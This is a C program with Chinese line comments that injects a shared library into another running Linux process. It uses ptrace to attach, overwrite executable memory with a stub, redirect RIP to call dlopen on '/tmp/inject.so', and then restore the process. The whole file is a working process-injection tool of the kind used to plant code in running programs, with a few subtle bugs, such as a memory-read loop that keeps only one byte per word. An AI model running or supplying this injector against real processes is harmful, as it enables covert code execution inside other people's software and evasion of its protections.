#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>

unsigned long long findLibrary(const char *library, pid_t pid) {  // 定义一个函数，用来找到目标库在指定进程地址空间中的基地址
char mapFilename[1024];                                          // 存储映射文件名的数组
char buffer[9076];                                               // 读取文件内容的缓存
FILE *fd;                                                        // 文件描述符
unsigned long long addr = 0;                                     // 存储库的基地址

	if (pid == -1) {  // 如果pid为-1，指代当前进程
        snprintf(mapFilename, sizeof(mapFilename), "/proc/self/maps");  // 构建当前进程的maps文件路径
    } else {  // 如果指定了其他进程
        snprintf(mapFilename, sizeof(mapFilename), "/proc/%d/maps", pid);  // 构建指定进程的maps文件路径
    }

    fd = fopen(mapFilename, "r");  // 打开maps文件以读取

    while(fgets(buffer, sizeof(buffer), fd)) {  // 逐行读取maps文件
        if (strstr(buffer, library)) {  // 如果当前行包含目标库名
            addr = strtoull(buffer, NULL, 16);  // 从行中解析出库的基地址
            break;  // 找到后即跳出循环
        }
    }

    fclose(fd);  // 关闭文件

    return addr;  // 返回找到的地址
}


void *freeSpaceAddr(pid_t pid) {  // 查找进程中的空闲地址空间
FILE *fp;                          // 文件指针
char filename[30];                 // 文件名缓冲区
char line[850];                    // 行缓冲区
void *addr;                        // 地址变量
char str[20];                      // 临时字符串存储
char perms[5];                     // 权限字符串

    sprintf(filename, "/proc/%d/maps", pid);  // 构造maps文件路径
    if ((fp = fopen(filename, "r")) == NULL) {  // 打开文件失败处理
        printf("[!] Error, could not open maps file for process %d\n", pid);  // 错误信息
        exit(1);  // 强制退出
    }

    while(fgets(line, 850, fp) != NULL) {  // 逐行读取
        sscanf(line, "%lx-%*lx %s %*s %s %*d", &addr, perms, str);  // 解析地址和权限

        if(strstr(perms, "x") != NULL) {  // 如果权限中包含可执行标志
            break;  // 找到可执行地址，跳出循环
        }
    }

    fclose(fp);  // 关闭文件
    return addr;  // 返回找到的地址
}

void ptraceRead(int pid, unsigned long long addr, void *data, int len) {  // 用ptrace读取进程内存
long word = 0;
int i = 0;
char *ptr = (char *)data;

    for (i=0; i < len; i+=sizeof(word), word=0) {  // 按字长逐步读取
        if ((word = ptrace(PTRACE_PEEKTEXT, pid, addr + i, NULL)) == -1) {  // 读取内存失败处理
            printf("[!] Error reading process memory\n");  // 错误信息
            exit(1);  // 强制退出
        }
        ptr[i] = word;  // 读取到的数据存入缓冲区
    }
}

void ptraceWrite(int pid, unsigned long long addr, void *data, int len) {  // 用ptrace写入进程内存
long word = 0;
int i=0;

    for(i=0; i < len; i+=sizeof(word), word=0) {  // 按字长逐步写入
        memcpy(&word, data + i, sizeof(word));  // 从缓冲区取出数据
        if (ptrace(PTRACE_POKETEXT, pid, addr + i, word) == -1) {  // 写入内存失败处理
            printf("[!] Error writing to process memory\n");  // 错误信息
            exit(1);  // 强制退出
        }
    }
}


void injectme(void) {  // 定义注入执行的代码段
    asm("mov $2, %esi\n"
        "call *%rax\n"
        "int $0x03\n"
    );
}

void inject(int pid, void *dlopenAddr) {  // 实现注入逻辑
struct user_regs_struct oldregs, regs;  // 寄存器结构，用于保存和修改寄存器状态
int status;  // 状态变量
unsigned char *oldcode;  // 用于备份代码的指针
void *freeaddr;  // 空闲地址
int x;

	// Attach to the target process
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);  // 附加到目标进程
    waitpid(pid, &status, WUNTRACED);  // 等待进程停止

    // Store the current register values for later
    ptrace(PTRACE_GETREGS, pid, NULL, &oldregs);  // 获取当前寄存器值
    memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));  // 复制寄存器状态

    oldcode = (unsigned char *)malloc(9076);  // 分配内存以备份代码

    // Find a place to write our code to
    freeaddr = (void *)freeSpaceAddr(pid);  // 查找可用的空间地址

    // Read from this addr to back up our code
    ptraceRead(pid, (unsigned long long)freeaddr, oldcode, 9076);  // 备份目标进程中的代码

    // Write our new stub
    ptraceWrite(pid, (unsigned long long)freeaddr, "/tmp/inject.so\x00", 16);  // 写入动态库路径
    ptraceWrite(pid, (unsigned long long)freeaddr+16, "\x90\x90\x90\x90\x90\x90\x90", 8);  // 写入NOPs
    ptraceWrite(pid, (unsigned long long)freeaddr+16+8, (&injectme)+4, 32);  // 写入注入代码

    // Update RIP to point to our code
    regs.rip = (unsigned long long)freeaddr + 16 + 8;  // 修改指令指针至新代码

    // Update RAX to point to dlopen()
    regs.rax = (unsigned long long)dlopenAddr;  // 设置RAX为dlopen地址

    // Update RDI to point to our library name string
    regs.rdi = (unsigned long long)freeaddr;  // 设置RDI为库名字符串地址

    // Set RSI as RTLD_LAZY for the dlopen call
    regs.rsi = 2;  // 设置RSI为RTLD_LAZY
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);  // 应用新的寄存器状态

    // Continue execution
    ptrace(PTRACE_CONT, pid, NULL, NULL);  // 继续进程执行
    waitpid(pid, &status, WUNTRACED);  // 等待进程再次停止

	// Ensure that we are returned because of our int 0x3 trap
    if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {  // 检查是否由于int 0x3停止
        // Get process registers, indicating if the injection suceeded
        ptrace(PTRACE_GETREGS, pid, NULL, &regs);  // 获取寄存器状态，检查注入是否成功
        if (regs.rax != 0x0) {
            printf("[*] Injected library loaded at address %p\n", (void*)regs.rax);  // 输出注入成功信息
        } else {
            printf("[!] Library could not be injected\n");  // 输出注入失败信息
            return;
        }

        //// Now We Restore The Application Back To It's Original State ////

        // Copy old code back to memory
        ptraceWrite(pid, (unsigned long long)freeaddr, oldcode, 9076);  // 恢复原始代码

        // Set registers back to original value
        ptrace(PTRACE_SETREGS, pid, NULL, &oldregs);  // 恢复原始寄存器状态

        // Resume execution in original place
        ptrace(PTRACE_DETACH, pid, NULL, NULL);  // 分离进程
    } else {
        printf("[!] Fatal Error: Process stopped for unknown reason\n");  // 输出未知错误
        exit(1);  // 强制退出
    }

}

int main(int argc, char **argv) {  // 主函数
unsigned long long remoteLib, localLib;  // 存储库的地址变量
void *dlopenAddr = NULL;  // dlopen函数地址
void *libdlAddr = NULL;  // libdl库地址

    // First we need to load libdl.so, to allow retrieval of the dlopen() symbol
    libdlAddr = dlopen("libdl-2.19.so", RTLD_LAZY);  // 加载libdl库
    if (libdlAddr == NULL) {
        printf("[!] Error opening libdl.so\n");  // 错误处理
        exit(1);  // 强制退出
    }
    printf("[*] libdl.so loaded at address %p\n", libdlAddr);  // 输出libdl加载地址

    // Get the address of dlopen() 
    dlopenAddr = dlsym(libdlAddr, "dlopen");  // 获取dlopen函数地址
    if (dlopenAddr == NULL) {
        printf("[!] Error locating dlopen() function\n");  // 错误处理
        exit(1);  // 强制退出
    }
    printf("[*] dlopen() found at address %p\n", dlopenAddr);  // 输出dlopen函数地址

    // Find the base address of libdl in our victim process
    remoteLib = findLibrary("libdl-2.19", atoi(argv[1]));  // 在目标进程中查找libdl库的基地址
    printf("[*] libdl located in PID %d at address %p\n", atoi(argv[1]), (void*)remoteLib);  // 输出目标进程中libdl的地址

    // Find the base address of libdl.so in our own process for comparison
    // NOT NEEDED !!! We can use libdlAddr, but check this
    localLib = findLibrary("libdl-2.19", -1);  // 在当前进程中查找libdl库的基地址（非必要）

    // Due to ASLR, we need to calculate the address in the target process 
    dlopenAddr = remoteLib + (dlopenAddr - localLib);  // 由于地址空间随机化，需要计算目标进程中的dlopen地址
    printf("[*] dlopen() offset in libdl found to be 0x%llx bytes\n", (unsigned long long)(libdlAddr - localLib));  // 输出dlopen在libdl中的偏移量
    printf("[*] dlopen() in target process at address 0x%llx\n", (unsigned long long)dlopenAddr);  // 输出目标进程中dlopen的实际地址

    // Inject our shared library into the target process
    inject(atoi(argv[1]), dlopenAddr);  // 执行注入
}
